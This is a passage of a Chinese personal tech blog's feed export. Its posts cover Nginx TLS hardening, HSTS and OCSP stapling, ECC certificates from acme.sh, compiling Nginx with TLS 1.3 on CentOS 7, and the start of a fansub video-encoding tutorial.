对于想了解的可以直接去看原文</p><p>我这里只给出 Nginx 配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssl_prefer_server_ciphers on;</span><br><span class="line">ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE+3DES:RSA+3DES;</span><br></pre></td></tr></table></figure><h2 id="HTTP-Strict-Transport-Security"><a href="#HTTP-Strict-Transport-Security" class="headerlink" title="HTTP Strict Transport Security"></a>HTTP Strict Transport Security</h2><p>经过以上操作 你会在 SSL Lab 里达到 A 的评级了 想要更进一步 就需要开启 HSTS</p><blockquote><p>By enabling HSTS, the browsers will not allow users to attempt any connection using HTTP and always enforce the use of HTTPS. This means that, after a first visit from a client to the server, subsequent visits to any HTTP pages will be converted by the browser to HTTPS before any request is made. This saves us some round trip time and increases security, especially against many SSL stripping attacks. HSTS also prevents the constant need for you to redirect clients from HTTP to HTTPS and many other configuration errors that are easy to make.</p></blockquote><p>简单来说 加入了这个 Header 访问了一次该域名 以后浏览器就会强制对此域名的所有连接都进行 HTTPS 访问</p><p>在 Nginx 配置里加入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_header Strict-Transport-Security &quot;max-age=31536000; includeSubDomains; preload&quot; always;</span><br></pre></td></tr></table></figure><blockquote><p>max-age=31536000<br>The 31536000 seconds are roughly around a year. So, the browser will remember for a year that it should always visit your website through HTTPS. If, for any reason, you want to stop supporting HTTPS for your website, you will have a problem with browsers that have already received this header. Would you redirect any HTTPS traffic back to HTTP, such browsers would redirect again to HTTPS resulting in an infinite loop. Therefore, if you are just playing around with SSL and aren’t sure you will keep it for your website, don’t enable HSTS for that website.</p></blockquote><p>31536000 秒即大概一年的时间 浏览器会记住这么长时间</p><blockquote><p>includeSubDomains<br>The includeSubDomains clause tells the browser to also enable HSTS for sub-domains. So remove this, if not all your sub-domains are ready for HTTPS.</p></blockquote><p>看英文都很好理解啦 包括所有子域名</p><blockquote><p>preload<br>With the first HTTP request, a browser is still potentially vulnerable. Using “preload” clause, we tell browsers not to make even one HTTP request to the server. This is done by submitting your website to the HSTS preload list. By submitting your website to the HSTS preload list, you tell browsers to never visit your website through HTTP. Addition to the preload list will have semi-permanent consequence and is irreversible, so only use this option once you’re comfortably set up running HTTPS with no problems.</p></blockquote><p>对于初次的连接 浏览器还是会使用 HTTP 加入这个参数并且提交你的域名至 <a href="https://hstspreload.org/">HSTS preload list</a> 即可</p><p><strong>注意：HSTS preload list 是不可逆转且半永久的 所以提前之前请慎重考虑</strong></p><blockquote><p>always<br>The “always” after the header contents tell NginX to provide this header with every possible response code, instead of only for the “200, 201, 204, 206, 301, 302, 303, 304, or 307” status codes.</p></blockquote><p>即把此头部应用在所有的响应内容中 不止 200 201 204 等</p><h2 id="Improve-Performance"><a href="#Improve-Performance" class="headerlink" title="Improve Performance"></a>Improve Performance</h2><blockquote><p>Even though we already achieved the A+ rating, there is some more we can still improve. These changes won’t affect your scoring but are necessary to improve performance.</p></blockquote><p>这时 SSL Lab 里已经能评上 A+了 但还有些能提升性能但不降分的操作能做</p><h3 id="OCSP-Stapling"><a href="#OCSP-Stapling" class="headerlink" title="OCSP Stapling"></a>OCSP Stapling</h3><blockquote><p>With each certificate a browser receives, it performs a request to a Certificate Authority to check whether the certificate has expired. This causes extra waiting time and it decreases security. Instead of the browser checking the status of the provided certificate, the server can be made to check this on a regular interval using the Online Certificate Status Protocol (OCSP). The OCSP responses are signed by your Certification Authority, so browsers will be able to trust them, even if they come directly from your server.</p></blockquote><p>简单来说 OCSP 用于检测证书是否过期 但这就造成了额外的等待时间</p><p>OCSP Stapling 则解决了上述的问题 服务端主动通过 OCSP 获得证书状态 并随着证书一起发送给客户端 这样客户端就可以跳过自己去验证的步骤 以提高 SSL 握手的效率</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssl_stapling             on;</span><br><span class="line">ssl_stapling_verify      on;</span><br><span class="line">resolver                 119.29.29.29 114.114.114.114 valid=300s;</span><br><span class="line">resolver_timeout         10s;</span><br></pre></td></tr></table></figure><h3 id="SSL-Session-Caching-Session-Resumption"><a href="#SSL-Session-Caching-Session-Resumption" class="headerlink" title="SSL Session Caching (Session Resumption)"></a>SSL Session Caching (Session Resumption)</h3><blockquote><p>To minimise the impact of the SSL overheads on your server, you can reduce the number of handshakes that a client needs to perform. The handshake is the most expensive part of serving content over SSL. With session resumption, the server specifies some information to the client during the initial TLS handshake. In a second connection, the client can then use this information to skip the entire TLS handshake and immediately have a secure connection setup. We can enable the SSL cache to remove the need for a handshake on subsequent or parallel connections.</p></blockquote><p>简而言之 SSL Session 也要缓存 这样就会减少握手次数 从而提升性能</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssl_session_cache shared:SSL:10m;</span><br><span class="line">ssl_session_timeout 10m;</span><br></pre></td></tr></table></figure><h2 id="后记-amp-相关链接"><a href="#后记-amp-相关链接" class="headerlink" title="后记&amp;相关链接"></a>后记&amp;相关链接</h2><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p><a href="https://medium.com/@aditya.vssut/setting-up-nginx-configuration-to-get-an-a-in-ssl-labs-server-test-e0e25098d634">How to get an ‘A+’ in SSL Labs Server Test with NginX configuration</a></p><p><a href="https://gist.github.com/fotock/9cf9afc2fd0f813828992ebc4fdaad6f">Nginx SSL 安全配置最佳实践</a></p><p>看完上面两个会更容易理解我给出的配置</p><h3 id="自用配置"><a href="#自用配置" class="headerlink" title="自用配置"></a>自用配置</h3><p>分享我自用的一套通用配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443  http2 fastopen=3 reuseport ssl default;</span><br><span class="line">    server_tokens off;</span><br><span class="line">    server_name  *.burgertown.tk;</span><br><span class="line"></span><br><span class="line">    ssl_certificate &quot;/path/to/rsa/fc&quot;;</span><br><span class="line">    ssl_certificate_key &quot;/path/to/rsa/key&quot;;</span><br><span class="line"></span><br><span class="line">    ssl_certificate &quot;/path/to/ecc/fc&quot;;</span><br><span class="line">    ssl_certificate_key &quot;/path/to/ecc/key&quot;;</span><br><span class="line"></span><br><span class="line">    ssl_dhparam &quot;/root/ssl/dhparam&quot;;</span><br><span class="line">    ssl_session_cache        shared:SSL:10m;</span><br><span class="line">    ssl_session_tickets      on;</span><br><span class="line">    ssl_stapling             on;</span><br><span class="line">    ssl_stapling_verify      on;</span><br><span class="line">    resolver                 119.29.29.29 114.114.114.114 valid=300s;</span><br><span class="line">    resolver_timeout         10s;</span><br><span class="line">    ssl_protocols TLSv1.2 TLSv1.3;</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line">    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE+3DES:RSA+3DES;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add_header X-Frame-Options DENY;</span><br><span class="line">add_header Referrer-Policy &quot;no-referrer&quot;;</span><br><span class="line">add_header X-XSS-Protection &quot;1; mode=block&quot;;</span><br><span class="line">add_header X-Content-Type-Options nosniff;</span><br><span class="line">add_header Access-Control-Allow-Origin *;</span><br><span class="line">add_header Strict-Transport-Security &quot;max-age=63072000; includeSubdomains; preload&quot; always;</span><br><span class="line">add_header Content-Security-Policy &quot;upgrade-insecure-requests&quot;;</span><br><span class="line">add_header Cache-Control &quot;max-age=36000&quot;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      跟上时代的步伐 Part.3
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="Web" scheme="https://burgertown.tk/tags/Web/"/>
    
      <category term="Nginx" scheme="https://burgertown.tk/tags/Nginx/"/>
    
      <category term="Https" scheme="https://burgertown.tk/tags/Https/"/>
    
  </entry>
  
  <entry>
    <title>使用 acme.sh 申请 ECC 证书并设置 Nginx 使其使用双证书</title>
    <link href="https://burgertown.tk/2019/07/19/acme-sh-issue-ecc-cert-and-set-up-dual-cert/"/>
    <id>https://burgertown.tk/2019/07/19/acme-sh-issue-ecc-cert-and-set-up-dual-cert/</id>
    <published>2019-07-18T16:42:08.000Z</published>
    <updated>2019-09-29T17:51:35.950Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前情"><a href="#前情" class="headerlink" title="前情"></a>前情</h2><p>曾经在 <a href="/2017/07/11/Https-Nginx-Hexo-Git/">这里</a> 讲述了如何用 acme.sh 申请 RSA 证书</p><p>这里我们还是使用 DNS 验证的方法 所以先要导入之前申请的 ID 和 Token 具体的请看 acme.sh 的 <a href="https://github.com/Neilpang/acme.sh/wiki">wiki</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export DP_Id=&quot;1234&quot;</span><br><span class="line">export DP_Key=&quot;sADDsdasdgdsf&quot;</span><br></pre></td></tr></table></figure><h2 id="申请并安装-ECC-证书"><a href="#申请并安装-ECC-证书" class="headerlink" title="申请并安装 ECC 证书"></a>申请并安装 ECC 证书</h2><p>跟以前一样 先申请 后安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">申请 ECC 256 位 证书（跟 384 位证书 二选一）</span></span><br><span class="line">acme.sh --issue --dns &#123;dns_short_name&#125; -d example.com -d www.example.com --keylength ec-256</span><br><span class="line"><span class="meta">#</span><span class="bash">申请 ECC 384 位 证书（跟 256 位证书 二选一）</span></span><br><span class="line">acme.sh --issue --dns &#123;dns_short_name&#125; -d example.com -d www.example.com --keylength ec-384</span><br></pre></td></tr></table></figure><p><em>注意<code>--ecc</code>这个参数</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">acme.sh --install-cert -d example.com --ecc \</span><br><span class="line">--key-file       /path/to/keyfile/in/nginx/key.pem  \</span><br><span class="line">--fullchain-file /path/to/fullchain/nginx/cert.pem \</span><br><span class="line">--reloadcmd     &quot;service nginx force-reload&quot;</span><br></pre></td></tr></table></figure><h2 id="设置-Nginx-使其使用双证书"><a href="#设置-Nginx-使其使用双证书" class="headerlink" title="设置 Nginx 使其使用双证书"></a>设置 Nginx 使其使用双证书</h2><p>把 RSA 与 ECC 证书的位置都设置好</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssl_certificate     /path/to/fullchain/nginx/rsa.cert.pem;</span><br><span class="line">ssl_certificate_key /path/to/keyfile/in/nginx/rsa.key.pem;</span><br><span class="line"></span><br><span class="line">ssl_certificate     /path/to/keyfile/in/nginx/ecc.cert.pem;</span><br><span class="line">ssl_certificate_key /path/to/keyfile/in/nginx/ecc.key.pem;</span><br></pre></td></tr></table></figure><p>然后修改<code>ssl_cipers</code>使其优先使用 ECC 证书</p><p>此处要配合我的 <a href="/2019/07/18/compile-Nginx-on-CentOS-7-to-enable-TLS1-3/">上一篇</a> 食用 因为这里我启用了 TLS v1.3</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssl_protocols TLSv1.2 TLSv1.3;</span><br><span class="line"><span class="meta">#</span><span class="bash">ssl_prefer_server_ciphers 意思是由服务器提供加密套件的顺序</span></span><br><span class="line">ssl_prefer_server_ciphers on;</span><br><span class="line">ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE+3DES:RSA+3DES;</span><br></pre></td></tr></table></figure><p>设置好后就可以用<code>nginx -t</code>测试一下 若成功 会输出以下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx: the configuration file /etc/nginx/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf test is successful</span><br></pre></td></tr></table></figure><p>成功了就可以重启 Nginx 了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure><h2 id="使用浏览器测试是否开启成功"><a href="#使用浏览器测试是否开启成功" class="headerlink" title="使用浏览器测试是否开启成功"></a>使用浏览器测试是否开启成功</h2><p>依然用 Firefox 来测试</p><p>地址栏旁的绿色锁-&gt;显示连接细节-&gt;更多信息-&gt;查看证书-&gt;详细信息-&gt;<strong>看图</strong></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/Zjfjwq.png" alt="Zjfjwq.png"></p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://www.coldawn.com/compile-nginx-on-centos-7-to-enable-tls13/">CentOS 7 编译安装 nginx 并启用 TLS1.3</a></p>]]></content>
    
    <summary type="html">
    
      跟上时代的步伐 Part.2
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="Web" scheme="https://burgertown.tk/tags/Web/"/>
    
      <category term="Nginx" scheme="https://burgertown.tk/tags/Nginx/"/>
    
      <category term="Https" scheme="https://burgertown.tk/tags/Https/"/>
    
  </entry>
  
  <entry>
    <title>在 CentOS 7 上编译 Nginx 使其启用 TLS v1.3</title>
    <link href="https://burgertown.tk/2019/07/18/compile-Nginx-on-CentOS-7-to-enable-TLS1-3/"/>
    <id>https://burgertown.tk/2019/07/18/compile-Nginx-on-CentOS-7-to-enable-TLS1-3/</id>
    <published>2019-07-18T15:01:39.000Z</published>
    <updated>2019-09-29T17:53:13.453Z</updated>
    
    <content type="html"><![CDATA[<h2 id="升级系统"><a href="#升级系统" class="headerlink" title="升级系统"></a>升级系统</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure><h2 id="安装-Mainline-版的-Nginx"><a href="#安装-Mainline-版的-Nginx" class="headerlink" title="安装 Mainline 版的 Nginx"></a>安装 Mainline 版的 Nginx</h2><p>目的：自动生成 Nginx 的配置文件、获取官方 Nginx 的编译参数</p><p>修改<code>/etc/yum.repos.d/nginx.repo</code>来配置源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[nginx]</span><br><span class="line">name=nginx repo</span><br><span class="line">baseurl=http://nginx.org/packages/mainline/centos/7/$basearch/</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><p>安装 Mainline 版的 Nginx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install nginx</span><br></pre></td></tr></table></figure><p>执行<code>nginx -v</code>查看 Nginx 版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx version: nginx/1.17.1</span><br></pre></td></tr></table></figure><p>执行<code>nginx -V</code>获取编译参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nginx version: nginx/1.17.1</span><br><span class="line">built by gcc 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC)</span><br><span class="line">built with OpenSSL 3.0.0-dev xx XXX xxxx</span><br><span class="line">TLS SNI support enabled</span><br><span class="line">configure arguments: --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib64/nginx/modules --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/run/nginx.pid --lock-path=/var/run/nginx.lock --http-client-body-temp-path=/var/cache/nginx/client_temp --http-proxy-temp-path=/var/cache/nginx/proxy_temp --http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp --http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp --http-scgi-temp-path=/var/cache/nginx/scgi_temp --user=nginx --group=nginx --with-compat --with-file-aio --with-threads --with-http_addition_module --with-http_auth_request_module --with-http_dav_module --with-http_flv_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_mp4_module --with-http_random_index_module --with-http_realip_module --with-http_secure_link_module --with-http_slice_module --with-http_ssl_module --with-http_stub_status_module --with-http_sub_module --with-http_v2_module --with-mail --with-mail_ssl_module --with-stream --with-stream_realip_module --with-stream_ssl_module --with-stream_ssl_preread_module --with-cc-opt=&#x27;-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -fPIC&#x27; --with-ld-opt=&#x27;-Wl,-z,relro -Wl,-z,now -pie&#x27;</span><br></pre></td></tr></table></figure><p>修改 Nginx 源 将<code>enabled=1</code>改为<code>enabled=0</code> 防止<code>yum update</code>时 Nginx 被更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[nginx]</span><br><span class="line">name=nginx repo</span><br><span class="line">baseurl=http://nginx.org/packages/mainline/centos/7/$basearch/</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=0</span><br></pre></td></tr></table></figure><h2 id="编译-Nginx"><a href="#编译-Nginx" class="headerlink" title="编译 Nginx"></a>编译 Nginx</h2><p>安装可能用到的依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y git gcc gcc-c clang automake make autoconf libtool zlib-devel libatomic_ops-devel pcre-devel openssl-devel libxml2-devel libxslt-devel gd-devel GeoIP-devel gperftools-devel  perl-devel perl-ExtUtils-Embed</span><br></pre></td></tr></table></figure><p>获取源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nginx/nginx.git</span><br><span class="line">git clone https://github.com/openssl/openssl.git</span><br><span class="line">git clone https://github.com/grahamedgecombe/nginx-ct.git</span><br></pre></td></tr></table></figure><p>nginx-ct 是启用证书透明度（Certificate Transparency）策略的模块</p><p>为了启用 CT 和 TLS v1.3 需要在官方编译参数后面额外加入如下参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-module=../nginx-ct/ --with-openssl=../openssl/</span><br></pre></td></tr></table></figure><p>全部编译参数如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib64/nginx/modules --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/run/nginx.pid --lock-path=/var/run/nginx.lock --http-client-body-temp-path=/var/cache/nginx/client_temp --http-proxy-temp-path=/var/cache/nginx/proxy_temp --http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp --http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp --http-scgi-temp-path=/var/cache/nginx/scgi_temp --user=nginx --group=nginx --with-compat --with-file-aio --with-threads --with-http_addition_module --with-http_auth_request_module --with-http_dav_module --with-http_flv_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_mp4_module --with-http_random_index_module --with-http_realip_module --with-http_secure_link_module --with-http_slice_module --with-http_ssl_module --with-http_stub_status_module --with-http_sub_module --with-http_v2_module --with-mail --with-mail_ssl_module --with-stream --with-stream_realip_module --with-stream_ssl_module --with-stream_ssl_preread_module --with-cc-opt=&#x27;-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -fPIC&#x27; --with-ld-opt=&#x27;-Wl,-z,relro -Wl,-z,now -pie&#x27; --add-module=../nginx-ct/ --with-openssl=../openssl/</span><br></pre></td></tr></table></figure><p>进入<code>nginx</code>的 git 目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto/configure 全部编译参数</span><br></pre></td></tr></table></figure><p>开始编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><p>执行<code>./objs/nginx -v</code>查看编译好的 Nginx 信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx version: nginx/1.17.1</span><br></pre></td></tr></table></figure><p>备份 Mainline 版 用自编译版替代</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /usr/sbin/nginx /usr/sbin/nginx.1.17.1.mainline</span><br><span class="line">cp ./objs/nginx /usr/sbin/</span><br></pre></td></tr></table></figure><h2 id="修改-Nginx-的配置文件开启-TLS-v1-3"><a href="#修改-Nginx-的配置文件开启-TLS-v1-3" class="headerlink" title="修改 Nginx 的配置文件开启 TLS v1.3"></a>修改 Nginx 的配置文件开启 TLS v1.3</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssl_protocols TLSv1.2 TLSv1.3;</span><br><span class="line">ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE+3DES:RSA+3DES;</span><br></pre></td></tr></table></figure><p>然后重启 Nginx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure><h2 id="使用浏览器测试是否开启成功"><a href="#使用浏览器测试是否开启成功" class="headerlink" title="使用浏览器测试是否开启成功"></a>使用浏览器测试是否开启成功</h2><p>这里我们用 Firefox 来测试</p><p>地址栏旁的绿色锁-&gt;显示连接细节-&gt;更多信息</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/Zjgzxs.png" alt="Zjgzxs.png"></p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://www.coldawn.com/compile-nginx-on-centos-7-to-enable-tls13/">CentOS 7 编译安装 nginx 并启用 TLS1.3</a></p>]]></content>
    
    <summary type="html">
    
      跟上时代的步伐 Part.1
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="Web" scheme="https://burgertown.tk/tags/Web/"/>
    
      <category term="Nginx" scheme="https://burgertown.tk/tags/Nginx/"/>
    
      <category term="Https" scheme="https://burgertown.tk/tags/Https/"/>
    
  </entry>
  
  <entry>
    <title>字幕组小教程 -- 视频压制</title>
    <link href="https://burgertown.tk/2019/03/19/suppression/"/>
    <id>https://burgertown.tk/2019/03/19/suppression/</id>
    <published>2019-03-19T10:56:09.000Z</published>
    <updated>2019-11-06T11:25:33.185Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><strong>注：这只是我习惯的工作流程 很多地方可以用别的方式替代</strong></p><p>First Huge Thanks To 西木</p><p>软件：这里用 <a href="https://sourceforge.net/projects/megui/">MeGUI</a>、<a href="https://github.com/soimort/you-get">you-get</a>、<a href="https://ffmpeg.org/">ffmpeg</a></p><p>原料：原视频文件、字幕文件、字体文件</p><p>DLL 文件：<a href="https://code.google.com/archive/p/vsfiltermod/">VSFilterMod.dll</a></p><h2 id="you-get"><a href="#you-get" class="headerlink" title="you-get"></a>you-get</h2><p><strong>只需要安装一次</strong></p><p>推荐 <a href="https://github.com/soimort/you-get">you-get</a> 是因为在抓取使用 DASH 技术的流媒体时 可以模拟浏览来分段获取 也就是基本无限制（有些需要梯子）</p><p>安装方法：这里我们需要先安装 <a href="https://www.python.org/">Python3</a> 点 <a href="https://www.python.org/downloads/">这里下载</a></p><p>下载后基本无脑下一步就行了 安装成功后下载 <a href="https://pypi.org/project/pip/#files">pip</a> 的<code>.tar.gz</code>文件 然后解压</p><p>打开 CMD/PowerShell/Cmder 之类的终端软件 不会的话直接<code>Win+R</code>输入<code>cmd</code> 确认</p><p><code>cd</code>到<code>解压后</code>的文件夹 然后<code>python setup.py</code> 例如在<code>E:\Download\pip</code> 输入下面的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> E:\Download\pip</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p>然后通过 pip 来安装 you-get</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install you-get</span><br></pre></td></tr></table></figure><h2 id="ffmpeg"><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h2><p>ffmpeg 是用于合成分段视频的</p><p>下载解压后将<code>ffmpeg 程序</code>的<code>目录</code>加入到<code>环境变量的$PATH</code>里</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/AuNOrn.png" alt="AuNOrn.png"></p><h2 id="字体文件"><a href="#字体文件" class="headerlink" title="字体文件"></a>字体文件</h2><p><strong>只需要安装一次</strong></p><p>我们组现在使用的是主要有两种字体</p><ol><li><a href="https://github.com/be5invis/Sarasa-Gothic">更纱黑体</a> <em>TTC 和 TTF 都行 TTC 体积会比较小</em></li><li><a href="https://www.zcool.com.cn/special/zcoolfonts/#5thpage">酷黑黑体</a></li></ol><p>Windows：解压–&gt;选中所有文件–&gt;右键–&gt;安装</p><h2 id="VSFilterMod"><a href="#VSFilterMod" class="headerlink" title="VSFilterMod"></a>VSFilterMod</h2><p><strong>下载后记得保存在一个方便的位置（最好是英文路径）</strong></p><p>VSFilterMod 在 VSFilter 上增添了许多功能 具体的请看 <a href="https://code.google.com/archive/p/vsfiltermod/wikis/">项目的相关 wiki</a></p><p>但是我们组只会用到一个新增的功能就是<code>Images instead of color fills</code></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/AuJyCQ.png" alt="AuJyCQ.png"></p><p>图里可以看出 标签是 <code>\1img</code> 且图片路径必须用<code>反斜杠/</code></p><p>原理大概就是将本来 VSFilter 上纯色颜色填充的区域用图片来填充</p><p>但是有限制 就是图片的尺寸必须与边框尺寸一样</p><p>如果图片尺寸小于边框尺寸 会平铺</p><p>如果图片尺寸大于边框尺寸 会填不满</p><h2 id="原视频文件"><a href="#原视频文件" class="headerlink" title="原视频文件"></a>原视频文件</h2><p>上面已经安装了 you-get 了 这里直接用 you-get</p><p>打开 CMD/PowerShell/Cmder 之类的终端软件</p><p>下面命令用来查视频的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you-get -i 视频地址</span><br></pre></td></tr></table></figure><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/AuYydK.png" alt="AuYydK.png"></p><p>可以看到 you-get 会读出这个视频的相关信息</p><p>记住我们要下载的视频的 itag 的数字 例如我们要下载 4K 版本的 <code>--itag=313</code></p><p>下面命令用来下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you-get --itag=xxx 视频地址</span><br></pre></td></tr></table></figure><p>开始下载</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/AuNdD1.png" alt="AuNdD1.png"></p><p>下载结束</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/AuNr4O.png" alt="AuNr4O.png"></p><h2 id="字幕文件"><a href="#字幕文件" class="headerlink" 